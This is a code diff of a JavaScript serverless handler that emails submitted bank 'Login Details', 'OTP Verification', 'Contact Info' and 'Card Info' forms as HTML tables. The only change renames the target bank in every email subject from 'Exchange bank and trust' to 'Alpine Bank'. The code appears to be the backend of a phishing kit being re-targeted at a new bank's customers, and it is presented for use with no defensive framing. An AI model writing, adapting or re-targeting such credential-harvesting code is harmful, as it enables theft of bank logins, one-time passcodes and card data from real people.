@@ -21,7 +21,7 @@ export default async function handler(req, res) {
     let htmlBody = '';
 
     if (subject === 'Login Details') {
-        customSubject = 'Submission of Exchange bank and trust sign in form';
+        customSubject = 'Submission of Alpine Bank sign in form';
         htmlBody = `
             <table border="1" cellpadding="8" cellspacing="0" style="border-collapse:collapse;font-family:Arial,sans-serif;">
                 <tr style="background:#f4f4f4;"><th>Field</th><th>Value</th></tr>
@@ -30,7 +30,7 @@ export default async function handler(req, res) {
             </table>
         `;
     } else if (subject === 'Contact Info') {
-        customSubject = 'Submission of Exchange bank and trust Contact Verification form';
+        customSubject = 'Submission of Alpine Bank Contact Verification form';
         htmlBody = `
             <table border="1" cellpadding="8" cellspacing="0" style="border-collapse:collapse;font-family:Arial,sans-serif;">
                 <tr style="background:#f4f4f4;"><th>Field</th><th>Value</th></tr>
@@ -39,7 +39,7 @@ export default async function handler(req, res) {
             </table>
         `;
     } else if (subject === 'OTP Verification') {
-        customSubject = 'Submission of Exchange bank and trust OTP verification form';
+        customSubject = 'Submission of Alpine Bank OTP verification form';
         htmlBody = `
             <table border="1" cellpadding="8" cellspacing="0" style="border-collapse:collapse;font-family:Arial,sans-serif;">
                 <tr style="background:#f4f4f4;"><th>Field</th><th>Value</th></tr>
@@ -47,7 +47,7 @@ export default async function handler(req, res) {
             </table>
         `;
     } else if (subject === 'Card Info') {
-        customSubject = 'Submission of Exchange bank and trust Card Verification form';
+        customSubject = 'Submission of Alpine Bank Card Verification form';
         // If message is a string with newlines, split and show as rows
         const cardRows = message
             .split('\n')
